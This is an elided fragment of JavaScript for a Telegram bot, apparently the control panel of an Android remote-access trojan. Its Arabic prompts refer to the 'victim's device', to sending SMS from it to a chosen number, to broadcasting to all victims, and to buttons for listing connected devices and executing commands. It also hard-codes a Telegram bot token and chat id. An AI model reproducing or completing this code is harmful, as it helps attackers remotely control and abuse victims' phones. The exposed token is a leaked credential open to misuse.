...
const token = '8207944233:AAFIJugYlEfgYwclsKoHwQjyd-GHs5eYw3A'
const id = '8379493995'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت المطور مهند ابو القيصر  𝗠𝗘𝗗𝗢 𝗕𝗥𝗢𝗕𝗟𝗘𝗠𝗦</h1>')
})
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور المهند ابو القيصر 𝗠𝗘𝗗𝗢 𝗕𝗥𝗢𝗕𝗟𝗘𝗠𝗦 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
        ...
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور مهند ابو القيصر 𝗠𝗘𝗗𝗢 𝗕𝗥𝗢𝗕𝗟𝗘𝗠𝗦 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
